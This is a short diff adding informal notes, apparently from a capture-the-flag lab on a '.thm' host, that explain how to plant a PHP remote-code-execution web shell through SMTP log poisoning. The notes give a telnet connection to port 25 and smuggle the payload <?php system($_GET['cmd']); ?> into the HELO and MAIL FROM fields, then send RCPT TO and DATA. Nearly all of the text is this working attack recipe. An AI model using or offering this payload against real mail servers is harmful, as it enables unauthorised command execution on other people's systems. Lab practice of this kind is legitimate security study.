@@ -1,0 +1,12 @@
+this is a pretty basic php RCE shell i saw on some cool video, here's how to load it:
+
+telnet thing.thm 25 (connecting to telnet)
+HELO <?php system($_GET['cmd']); ?> (loading the command execution)
+MAIL FROM:sm0key@<?php system($_GET['cmd']); ?> (doing something more with the mail)
+RCPT TO: charles (this needs to be a known user inside of the recipient table)
+DATA
+
+then, press enter twice, 
+then press full stop,
+
+this took some time to get right, the php shell has to be perfect and you also need to watch out for input sanitisation.
